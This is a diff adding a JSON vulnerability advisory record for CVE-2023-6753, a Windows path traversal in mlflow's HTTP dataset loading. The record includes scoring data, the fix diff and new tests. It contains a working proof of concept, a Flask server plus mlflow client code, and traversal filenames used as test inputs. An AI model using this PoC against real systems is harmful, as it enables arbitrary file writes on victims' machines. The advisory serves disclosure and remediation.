@@ -1,0 +1,75 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "REQUIRED",
+        "scope": "CHANGED",
+        "confidentiality": "LOW",
+        "integrity": "HIGH",
+        "availability": "LOW"
+    },
+    "credit": [
+        "haxatron"
+    ],
+    "cvssDetails": [
+        {
+            "assigner": "NVD",
+            "cvssV3BaseScore": 8.8,
+            "cvssV3Vector": {
+                "CVSS": "3.1",
+                "attackVector": "NETWORK",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "NONE",
+                "userInteraction": "REQUIRED",
+                "scope": "UNCHANGED",
+                "confidentiality": "HIGH",
+                "integrity": "HIGH",
+                "availability": "HIGH"
+            },
+            "severity": "high"
+        }
+    ],
+    "cvssScore": 8.8,
+    "disclosureTime": "2023-12-13 01:43:49",
+    "epssDetails": {
+        "modelVersion": "v2023.03.01",
+        "percentile": "0.08378",
+        "probability": "0.00044"
+    },
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-PYTHON-MLFLOW-6124044",
+    "identifiers": {
+        "CVE": [
+            "CVE-2023-6753"
+        ],
+        "CWE": [
+            "CWE-22"
+        ]
+    },
+    "language": "python",
+    "malicious": false,
+    "packageManager": "pip",
+    "publicationTime": "2023-12-13 12:51:19",
+    "remediation": "Upgrade mlflow to version 2.9.2 or higher. ",
+    "severity": "high",
+    "socialTrendAlert": false,
+    "title": "Path Traversal",
+    "vulnDescription": {
+        "Overview": "mlflow is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models. Affected versions of this package are vulnerable to Path Traversal by loading datasets on Windows. Exploiting this vulnerability is possible when the filename is controlled by the path of the URL on Windows then, it is possible to write files outside of the current working directory using backslash '' instead of front slash '/' as posixpath.basename does not work with Windows paths. ",
+        "PoC": "Server: from flask import Flask, Response app = Flask(__name__) @app.route(\"/\\\\Users\\\\User\\\\poc.txt\") def index(): res = Response(\"\"\" \"fixed acidity\";\"volatile acidity\";\"citric acid\";\"residual sugar\";\"chlorides\";\"free sulfur dioxide\";\"total sulfur dioxide\";\"density\";\"pH\";\"sulphates\";\"alcohol\";\"quality\" 7.4;0.7;0;1.9;0.076;11;34;0.9978;3.51;0.56;9.4;5 7.8;0.88;0;2.6;0.098;25;67;0.9968;3.2;0.68;9.8;5 \"\"\") return res app.run(\"0.0.0.0\", 4444) Run the following on Windows, make sure to replace the \\Users\\User\\poc.txt to whatever directory you control. import mlflow.data import pandas as pd from mlflow.data.pandas_dataset import PandasDataset dataset_source_url = \"http://localhost:4444/\\\\Users\\\\User\\\\poc.txt\" df = pd.read_csv(dataset_source_url) dataset: PandasDataset = mlflow.data.from_pandas(df, source=dataset_source_url) with mlflow.start_run(): mlflow.log_input(dataset, context=\"training\") run = mlflow.get_run(mlflow.last_active_run().info.run_id) dataset_info = run.inputs.dataset_inputs[0].dataset dataset_source = mlflow.data.get_source(dataset_info) dataset_source.load() "
+    },
+    "source_code": [
+        {
+            "filename": "mlflow/data/http_dataset_source.py",
+            "diff": "@@ -1,5 +1,4 @@\n import os\n-import posixpath\n import re\n from typing import Any, Dict\n from urllib.parse import urlparse\n@@ -41,6 +40,23 @@ def url(self):\n     def _get_source_type() -> str:\n         return \"http\"\n \n+    def _extract_filename(self, response) -> str:\n+        \"\"\"\n+        Extracts a filename from the Content-Disposition header or the URL's path.\n+        \"\"\"\n+        if content_disposition := response.headers.get(\"Content-Disposition\"):\n+            for match in re.finditer(r\"filename=(.+)\", content_disposition):\n+                filename = match[1].strip(\"'\\\"\")\n+                if _is_path(filename):\n+                    raise MlflowException.invalid_parameter_value(\n+                        f\"Invalid filename in Content-Disposition header: {filename}. \"\n+                        \"It must be a file name, not a path.\"\n+                    )\n+                return filename\n+\n+        # Extract basename from URL if no valid filename in Content-Disposition\n+        return os.path.basename(urlparse(self.url).path)\n+\n     def load(self, dst_path=None) -> str:\n         \"\"\"\n         Downloads the dataset source to the local filesystem.\n@@ -58,21 +74,9 @@ def load(self, dst_path=None) -> str:\n         )\n         augmented_raise_for_status(resp)\n \n-        path = urlparse(self.url).path\n-        content_disposition = resp.headers.get(\"Content-Disposition\")\n-        if content_disposition is not None and (\n-            file_name := next(re.finditer(r\"filename=(.+)\", content_disposition), None)\n-        ):\n-            # NB: If the filename is quoted, unquote it\n-            basename = file_name[1].strip(\"'\\\"\")\n-            if _is_path(basename):\n-                raise MlflowException.invalid_parameter_value(\n-                    f\"Invalid filename in Content-Disposition header: {basename}. \"\n-                    \"It must be a file name, not a path.\"\n-                )\n-        elif path is not None and len(posixpath.basename(path)) > 0:\n-            basename = posixpath.basename(path)\n-        else:\n+        basename = self._extract_filename(resp)\n+\n+        if not basename:\n             basename = \"dataset_source\"\n \n         if dst_path is None:"
+        },
+        {
+            "filename": "tests/data/test_http_dataset_source.py",
+            "diff": "@@ -8,6 +8,7 @@\n from mlflow.data.dataset_source_registry import get_dataset_source_from_json, resolve_dataset_source\n from mlflow.data.http_dataset_source import HTTPDatasetSource\n from mlflow.exceptions import MlflowException\n+from mlflow.utils.os import is_windows\n from mlflow.utils.rest_utils import cloud_storage_http_request\n \n \n@@ -155,3 +156,30 @@ def download_with_mock_content_disposition_headers(*args, **kwargs):\n \n         with pytest.raises(MlflowException, match=\"Invalid filename in Content-Disposition header\"):\n             source.load()\n+\n+\n+@pytest.mark.skipif(not is_windows(), reason=\"This test only passes on Windows\")\n+@pytest.mark.parametrize(\n+    \"filename\",\n+    [\n+        r\"..\\..\\poc.txt\",\n+        r\"Users\\User\\poc.txt\",\n+    ],\n+)\n+def test_source_load_with_content_disposition_header_invalid_filename_windows(filename):\n+    def download_with_mock_content_disposition_headers(*args, **kwargs):\n+        response = cloud_storage_http_request(*args, **kwargs)\n+        response.headers = {\"Content-Disposition\": f\"attachment; filename={filename}\"}\n+        return response\n+\n+    with mock.patch(\n+        \"mlflow.data.http_dataset_source.cloud_storage_http_request\",\n+        side_effect=download_with_mock_content_disposition_headers,\n+    ):\n+        source = HTTPDatasetSource(\n+            \"https://raw.githubusercontent.com/mlflow/mlflow/master/tests/datasets/winequality-red.csv\"\n+        )\n+\n+        # Expect an MlflowException for invalid filenames\n+        with pytest.raises(MlflowException, match=\"Invalid filename in Content-Disposition header\"):\n+            source.load()"
+        }
+    ],
+    "commitTime": "2023-12-14 02:01:34"
+}
